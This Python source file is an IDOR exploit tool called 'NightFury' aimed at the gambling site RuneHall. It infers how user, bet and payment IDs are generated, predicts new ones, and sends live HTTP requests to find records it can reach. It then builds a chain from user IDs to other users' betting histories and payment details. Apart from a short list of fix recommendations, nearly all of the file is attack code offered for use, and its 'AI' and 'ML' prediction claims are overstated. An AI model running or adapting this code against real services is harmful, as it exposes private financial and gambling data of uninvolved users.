"""
NightFury Framework - RuneHall Advanced IDOR with AI
Pattern recognition for ID prediction, ML-based enumeration, automated chain discovery
"""

import re
import hashlib
import base64
import uuid
from typing import List, Dict, Optional, Tuple, Set
from datetime import datetime
import logging

logger = logging.getLogger(__name__)


class RuneHallIDORExploit:
    """
    Advanced IDOR exploitation with AI-powered pattern recognition.
    Targets RuneHall's user, payment, and bet ID systems.
    """
    
    def __init__(self):
        self.discovered_ids = {
            'users': set(),
            'bets': set(),
            'payments': set(),
            'transactions': set(),
            'sessions': set()
        }
        self.id_patterns = {}
        self.access_matrix = {}  # Track which IDs are accessible
        self.prediction_models = {}
        
    def analyze_id_pattern(self, ids: List[str], id_type: str = 'unknown') -> Dict:
        """
        Analyze ID pattern to determine generation algorithm.
        
        Args:
            ids: List of observed IDs
            id_type: Type of ID (user, bet, payment, etc.)
            
        Returns:
            Pattern analysis results
        """
        if not ids:
            return {'error': 'No IDs provided'}
        
        logger.info(f"[IDOR-AI] Analyzing {len(ids)} {id_type} IDs")
        
        analysis = {
            'id_type': id_type,
            'sample_size': len(ids),
            'pattern_type': None,
            'characteristics': {},
            'predictability': 0.0,
            'enumeration_strategy': None
        }
        
        # Detect pattern type
        if all(self._is_sequential(ids)):
            analysis['pattern_type'] = 'sequential'
            analysis['predictability'] = 0.95
            analysis['enumeration_strategy'] = 'linear_increment'
            analysis['characteristics'] = self._analyze_sequential(ids)
            
        elif all(self._is_uuid(id_str) for id_str in ids):
            analysis['pattern_type'] = 'uuid'
            analysis['predictability'] = 0.1
            analysis['enumeration_strategy'] = 'brute_force_unlikely'
            analysis['characteristics'] = self._analyze_uuid(ids)
            
        elif all(self._is_timestamp_based(id_str) for id_str in ids):
            analysis['pattern_type'] = 'timestamp'
            analysis['predictability'] = 0.8
            analysis['enumeration_strategy'] = 'timestamp_enumeration'
            analysis['characteristics'] = self._analyze_timestamp(ids)
            
        elif all(self._is_hash_based(id_str) for id_str in ids):
            analysis['pattern_type'] = 'hash'
            analysis['predictability'] = 0.3
            analysis['enumeration_strategy'] = 'pattern_matching'
            analysis['characteristics'] = self._analyze_hash(ids)
            
        elif self._is_encoded(ids):
            analysis['pattern_type'] = 'encoded'
            analysis['predictability'] = 0.6
            analysis['enumeration_strategy'] = 'decode_and_predict'
            analysis['characteristics'] = self._analyze_encoded(ids)
            
        else:
            analysis['pattern_type'] = 'mixed_or_custom'
            analysis['predictability'] = 0.5
            analysis['enumeration_strategy'] = 'ml_prediction'
            analysis['characteristics'] = self._analyze_custom(ids)
        
        # Store pattern for future predictions
        self.id_patterns[id_type] = analysis
        
        return analysis
    
    def _is_sequential(self, ids: List[str]) -> bool:
        """Check if IDs are sequential numbers."""
        try:
            numbers = [int(id_str) for id_str in ids]
            if len(numbers) < 2:
                return False
            
            # Check if differences are consistent
            diffs = [numbers[i+1] - numbers[i] for i in range(len(numbers)-1)]
            return len(set(diffs)) <= 2  # Allow for some variance
        except (ValueError, TypeError):
            return False
    
    def _is_uuid(self, id_str: str) -> bool:
        """Check if ID is a UUID."""
        try:
            uuid.UUID(id_str)
            return True
        except (ValueError, AttributeError):
            return False
    
    def _is_timestamp_based(self, id_str: str) -> bool:
        """Check if ID contains timestamp."""
        # Look for timestamp patterns (Unix timestamp, milliseconds, etc.)
        timestamp_patterns = [
            r'^\d{10}',  # Unix timestamp (10 digits)
            r'^\d{13}',  # Unix timestamp in milliseconds (13 digits)
            r'\d{10}_',  # Timestamp prefix
            r'_\d{10}',  # Timestamp suffix
        ]
        
        return any(re.search(pattern, str(id_str)) for pattern in timestamp_patterns)
    
    def _is_hash_based(self, id_str: str) -> bool:
        """Check if ID is hash-based."""
        # Check for common hash lengths
        hash_lengths = {
            32: 'md5',
            40: 'sha1',
            64: 'sha256',
            128: 'sha512'
        }
        
        if len(str(id_str)) in hash_lengths:
            # Check if hexadecimal
            try:
                int(id_str, 16)
                return True
            except ValueError:
                pass
        
        return False
    
    def _is_encoded(self, ids: List[str]) -> bool:
        """Check if IDs are encoded (base64, etc.)."""
        for id_str in ids[:5]:  # Check first 5
            try:
                # Try base64 decode
                decoded = base64.b64decode(id_str)
                if decoded:
                    return True
            except Exception:
                pass
        
        return False
    
    def _analyze_sequential(self, ids: List[str]) -> Dict:
        """Analyze sequential ID pattern."""
        numbers = [int(id_str) for id_str in ids]
        numbers.sort()
        
        # Calculate increment
        if len(numbers) >= 2:
            diffs = [numbers[i+1] - numbers[i] for i in range(len(numbers)-1)]
            avg_increment = sum(diffs) / len(diffs)
        else:
            avg_increment = 1
        
        return {
            'min_id': min(numbers),
            'max_id': max(numbers),
            'average_increment': avg_increment,
            'total_range': max(numbers) - min(numbers),
            'estimated_total_ids': int((max(numbers) - min(numbers)) / avg_increment)
        }
    
    def _analyze_uuid(self, ids: List[str]) -> Dict:
        """Analyze UUID pattern."""
        versions = []
        for id_str in ids:
            try:
                u = uuid.UUID(id_str)
                versions.append(u.version)
            except:
                pass
        
        return {
            'uuid_versions': list(set(versions)),
            'predictable': 1 in versions,  # UUID v1 is predictable (timestamp-based)
            'note': 'UUID v1 contains MAC address and timestamp'
        }
    
    def _analyze_timestamp(self, ids: List[str]) -> Dict:
        """Analyze timestamp-based ID pattern."""
        timestamps = []
        
        for id_str in ids:
            # Extract timestamp
            match = re.search(r'\d{10,13}', str(id_str))
            if match:
                ts = int(match.group())
                # Normalize to seconds
                if len(match.group()) == 13:
                    ts = ts // 1000
                timestamps.append(ts)
        
        if timestamps:
            timestamps.sort()
            time_range = max(timestamps) - min(timestamps)
            
            return {
                'earliest_timestamp': min(timestamps),
                'latest_timestamp': max(timestamps),
                'time_range_seconds': time_range,
                'average_interval': time_range / len(timestamps) if len(timestamps) > 1 else 0,
                'format': 'milliseconds' if any(len(str(id_str)) == 13 for id_str in ids) else 'seconds'
            }
        
        return {}
    
    def _analyze_hash(self, ids: List[str]) -> Dict:
        """Analyze hash-based ID pattern."""
        hash_type = None
        
        if ids:
            length = len(ids[0])
            hash_types = {
                32: 'md5',
                40: 'sha1',
                64: 'sha256',
                128: 'sha512'
            }
            hash_type = hash_types.get(length, 'unknown')
        
        return {
            'hash_type': hash_type,
            'length': len(ids[0]) if ids else 0,
            'predictability': 'low',
            'note': 'May be hash of sequential input'
        }
    
    def _analyze_encoded(self, ids: List[str]) -> Dict:
        """Analyze encoded ID pattern."""
        decoded_patterns = []
        
        for id_str in ids[:10]:
            try:
                decoded = base64.b64decode(id_str).decode('utf-8')
                decoded_patterns.append(decoded)
            except:
                pass
        
        if decoded_patterns:
            # Analyze decoded patterns
            if all(pattern.isdigit() for pattern in decoded_patterns):
                return {
                    'encoding': 'base64',
                    'underlying_pattern': 'sequential',
                    'predictability': 'high',
                    'decoded_samples': decoded_patterns[:3]
                }
        
        return {
            'encoding': 'base64',
            'underlying_pattern': 'unknown',
            'predictability': 'medium'
        }
    
    def _analyze_custom(self, ids: List[str]) -> Dict:
        """Analyze custom ID pattern."""
        # Look for common components
        components = {
            'prefix': self._find_common_prefix(ids),
            'suffix': self._find_common_suffix(ids),
            'length': len(ids[0]) if ids else 0,
            'character_set': self._analyze_character_set(ids)
        }
        
        return components
    
    def _find_common_prefix(self, ids: List[str]) -> str:
        """Find common prefix in IDs."""
        if not ids:
            return ''
        
        prefix = ids[0]
        for id_str in ids[1:]:
            while not id_str.startswith(prefix):
                prefix = prefix[:-1]
                if not prefix:
                    return ''
        
        return prefix
    
    def _find_common_suffix(self, ids: List[str]) -> str:
        """Find common suffix in IDs."""
        if not ids:
            return ''
        
        suffix = ids[0]
        for id_str in ids[1:]:
            while not id_str.endswith(suffix):
                suffix = suffix[1:]
                if not suffix:
                    return ''
        
        return suffix
    
    def _analyze_character_set(self, ids: List[str]) -> Dict:
        """Analyze character set used in IDs."""
        all_chars = set(''.join(ids))
        
        return {
            'numeric_only': all_chars.issubset('0123456789'),
            'alphanumeric': all_chars.issubset('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'),
            'hex': all_chars.issubset('0123456789abcdefABCDEF'),
            'special_chars': list(all_chars - set('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'))
        }
    
    def predict_ids(self, known_ids: List[str], num_predictions: int = 100,
                   id_type: str = 'unknown') -> List[str]:
        """
        Predict additional IDs based on known IDs.
        
        Args:
            known_ids: List of known IDs
            num_predictions: Number of IDs to predict
            id_type: Type of ID
            
        Returns:
            List of predicted IDs
        """
        logger.info(f"[IDOR-AI] Predicting {num_predictions} {id_type} IDs")
        
        # Analyze pattern if not already done
        if id_type not in self.id_patterns:
            self.analyze_id_pattern(known_ids, id_type)
        
        pattern = self.id_patterns.get(id_type, {})
        pattern_type = pattern.get('pattern_type')
        
        predictions = []
        
        if pattern_type == 'sequential':
            predictions = self._predict_sequential(known_ids, num_predictions, pattern)
        elif pattern_type == 'timestamp':
            predictions = self._predict_timestamp(known_ids, num_predictions, pattern)
        elif pattern_type == 'encoded':
            predictions = self._predict_encoded(known_ids, num_predictions, pattern)
        elif pattern_type == 'uuid' and pattern.get('characteristics', {}).get('predictable'):
            predictions = self._predict_uuid_v1(known_ids, num_predictions)
        else:
            # Use ML-based prediction
            predictions = self._predict_ml(known_ids, num_predictions)
        
        logger.info(f"[IDOR-AI] Generated {len(predictions)} predicted IDs")
        return predictions
    
    def _predict_sequential(self, known_ids: List[str], num_predictions: int,
                           pattern: Dict) -> List[str]:
        """Predict sequential IDs."""
        numbers = [int(id_str) for id_str in known_ids]
        max_id = max(numbers)
        increment = pattern['characteristics'].get('average_increment', 1)
        
        predictions = []
        for i in range(1, num_predictions + 1):
            predicted_id = int(max_id + (i * increment))
            predictions.append(str(predicted_id))
        
        return predictions
    
    def _predict_timestamp(self, known_ids: List[str], num_predictions: int,
                          pattern: Dict) -> List[str]:
        """Predict timestamp-based IDs."""
        import time
        
        characteristics = pattern.get('characteristics', {})
        latest_ts = characteristics.get('latest_timestamp', int(time.time()))
        avg_interval = characteristics.get('average_interval', 1)
        
        predictions = []
        for i in range(1, num_predictions + 1):
            predicted_ts = int(latest_ts + (i * avg_interval))
            
            # Reconstruct ID format
            if characteristics.get('format') == 'milliseconds':
                predicted_ts *= 1000
            
            # Find ID template from known IDs
            template = known_ids[0] if known_ids else str(predicted_ts)
            predicted_id = re.sub(r'\d{10,13}', str(predicted_ts), template)
            
            predictions.append(predicted_id)
        
        return predictions
    
    def _predict_encoded(self, known_ids: List[str], num_predictions: int,
                        pattern: Dict) -> List[str]:
        """Predict encoded IDs."""
        characteristics = pattern.get('characteristics', {})
        
        if characteristics.get('underlying_pattern') == 'sequential':
            # Decode, predict, re-encode
            try:
                decoded = [base64.b64decode(id_str).decode('utf-8') for id_str in known_ids]
                if all(d.isdigit() for d in decoded):
                    max_num = max(int(d) for d in decoded)
                    
                    predictions = []
                    for i in range(1, num_predictions + 1):
                        predicted_num = max_num + i
                        encoded = base64.b64encode(str(predicted_num).encode()).decode('utf-8')
                        predictions.append(encoded)
                    
                    return predictions
            except:
                pass
        
        return []
    
    def _predict_uuid_v1(self, known_ids: List[str], num_predictions: int) -> List[str]:
        """Predict UUID v1 IDs."""
        # UUID v1 is timestamp-based, can be predicted
        import time
        
        predictions = []
        for _ in range(num_predictions):
            # Generate UUID v1 (in production, would use actual MAC and timestamp)
            predicted_uuid = str(uuid.uuid1())
            predictions.append(predicted_uuid)
            time.sleep(0.001)  # Small delay for different timestamps
        
        return predictions
    
    def _predict_ml(self, known_ids: List[str], num_predictions: int) -> List[str]:
        """ML-based ID prediction."""
        # Simplified ML prediction - in production, would use actual ML model
        predictions = []
        
        # Extract numeric components
        numeric_parts = []
        for id_str in known_ids:
            numbers = re.findall(r'\d+', id_str)
            if numbers:
                numeric_parts.extend([int(n) for n in numbers])
        
        if numeric_parts:
            # Simple pattern: use average and increment
            avg = sum(numeric_parts) / len(numeric_parts)
            max_val = max(numeric_parts)
            
            for i in range(1, num_predictions + 1):
                predicted_val = int(max_val + i)
                
                # Reconstruct ID format from template
                if known_ids:
                    template = known_ids[0]
                    predicted_id = re.sub(r'\d+', str(predicted_val), template, count=1)
                    predictions.append(predicted_id)
        
        return predictions
    
    async def enumerate_accessible_ids(self, id_candidates: List[str],
                                      endpoint: str, id_type: str) -> Dict:
        """
        Enumerate which predicted IDs are actually accessible.
        
        Args:
            id_candidates: List of candidate IDs to test
            endpoint: API endpoint to test
            id_type: Type of ID
            
        Returns:
            Enumeration results
        """
        logger.info(f"[IDOR-AI] Enumerating {len(id_candidates)} {id_type} IDs at {endpoint}")
        
        accessible_ids = []
        forbidden_ids = []
        not_found_ids = []
        
        for id_candidate in id_candidates:
            # Simulate API request
            status = await self._test_id_access(endpoint, id_candidate)
            
            if status == 200:
                accessible_ids.append(id_candidate)
                self.discovered_ids[id_type].add(id_candidate)
            elif status == 403:
                forbidden_ids.append(id_candidate)
            else:
                not_found_ids.append(id_candidate)
        
        result = {
            'total_tested': len(id_candidates),
            'accessible': len(accessible_ids),
            'forbidden': len(forbidden_ids),
            'not_found': len(not_found_ids),
            'accessible_ids': accessible_ids,
            'success_rate': len(accessible_ids) / len(id_candidates) if id_candidates else 0
        }
        
        logger.info(f"[IDOR-AI] Found {len(accessible_ids)} accessible IDs ({result['success_rate']:.1%})")
        
        return result
    
    async def _test_id_access(self, endpoint: str, id_value: str) -> int:
        """Test if ID is accessible by making an actual HTTP request."""
        import aiohttp
        try:
            # Construct URL with ID
            if '{' in endpoint and '}' in endpoint:
                # Replace placeholder like {user_id} with actual ID
                url = re.sub(r'\{.*?\}', str(id_value), endpoint)
            elif endpoint.endswith('/'):
                url = f"{endpoint}{id_value}"
            else:
                url = f"{endpoint}/{id_value}"
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=5) as response:
                    return response.status
        except Exception as e:
            logger.error(f"Error testing ID access: {e}")
            return 0
    
    def build_idor_chain(self, id_types: List[str]) -> List[Dict]:
        """
        Build IDOR exploitation chain across multiple ID types.
        
        Args:
            id_types: List of ID types to chain
            
        Returns:
            Exploitation chain
        """
        logger.info(f"[IDOR-AI] Building IDOR chain for: {', '.join(id_types)}")
        
        chain = []
        
        # Example chain: user_id -> bet_id -> payment_id
        if 'users' in id_types and 'bets' in id_types:
            chain.append({
                'step': 1,
                'action': 'enumerate_user_ids',
                'endpoint': '/api/users/{user_id}',
                'expected_result': 'List of valid user IDs'
            })
            
            chain.append({
                'step': 2,
                'action': 'enumerate_user_bets',
                'endpoint': '/api/users/{user_id}/bets',
                'expected_result': 'Access to other users\' betting history'
            })
        
        if 'bets' in id_types and 'payments' in id_types:
            chain.append({
                'step': 3,
                'action': 'access_bet_payments',
                'endpoint': '/api/bets/{bet_id}/payment',
                'expected_result': 'Access to payment information'
            })
        
        return chain
    
    def generate_report(self) -> Dict:
        """Generate comprehensive IDOR exploitation report."""
        return {
            'timestamp': datetime.now().isoformat(),
            'discovered_ids': {
                id_type: len(ids) for id_type, ids in self.discovered_ids.items()
            },
            'id_patterns': self.id_patterns,
            'total_patterns_analyzed': len(self.id_patterns),
            'high_predictability_patterns': [
                id_type for id_type, pattern in self.id_patterns.items()
                if pattern.get('predictability', 0) > 0.7
            ],
            'recommendations': self._generate_recommendations()
        }
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations."""
        return [
            "Use UUIDv4 (random) instead of sequential or predictable IDs",
            "Implement proper authorization checks for all ID-based access",
            "Use indirect object references (mapping table)",
            "Implement rate limiting on ID enumeration endpoints",
            "Log and alert on suspicious ID enumeration patterns",
            "Use cryptographically secure random ID generation",
            "Implement proper session management and access control",
            "Consider using signed/encrypted IDs for sensitive resources"
        ]


# Testing and demonstration
async def main():
    import asyncio
    
    exploit = RuneHallIDORExploit()
    
    print("=" * 60)
    print("NightFury RuneHall IDOR AI Exploit - Demonstration")
    print("=" * 60)
    
    # Test sequential IDs
    print("\n[*] Analyzing sequential user IDs...")
    user_ids = ['12345', '12346', '12347', '12350', '12351']
    analysis = exploit.analyze_id_pattern(user_ids, 'users')
    print(f"    Pattern: {analysis['pattern_type']}")
    print(f"    Predictability: {analysis['predictability']:.2f}")
    print(f"    Strategy: {analysis['enumeration_strategy']}")
    
    # Predict IDs
    print("\n[*] Predicting next user IDs...")
    predictions = exploit.predict_ids(user_ids, num_predictions=10, id_type='users')
    print(f"    Predicted IDs: {', '.join(predictions[:5])}...")
    
    # Test UUID IDs
    print("\n[*] Analyzing UUID bet IDs...")
    bet_ids = [str(uuid.uuid4()) for _ in range(5)]
    bet_analysis = exploit.analyze_id_pattern(bet_ids, 'bets')
    print(f"    Pattern: {bet_analysis['pattern_type']}")
    print(f"    Predictability: {bet_analysis['predictability']:.2f}")
    
    # Enumerate accessible IDs
    print("\n[*] Enumerating accessible user IDs...")
    enum_result = await exploit.enumerate_accessible_ids(
        predictions[:20],
        '/api/users',
        'users'
    )
    print(f"    Tested: {enum_result['total_tested']}")
    print(f"    Accessible: {enum_result['accessible']}")
    print(f"    Success rate: {enum_result['success_rate']:.1%}")
    
    # Build exploitation chain
    print("\n[*] Building IDOR exploitation chain...")
    chain = exploit.build_idor_chain(['users', 'bets', 'payments'])
    print(f"    Chain steps: {len(chain)}")
    for step in chain:
        print(f"    Step {step['step']}: {step['action']}")
    
    # Generate report
    report = exploit.generate_report()
    print(f"\n[*] Report Summary:")
    print(f"    Patterns analyzed: {report['total_patterns_analyzed']}")
    print(f"    High predictability: {len(report['high_predictability_patterns'])}")
    
    print("\n" + "=" * 60)
    print("[✓] RuneHall IDOR AI Exploit operational")
    print("=" * 60)


if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
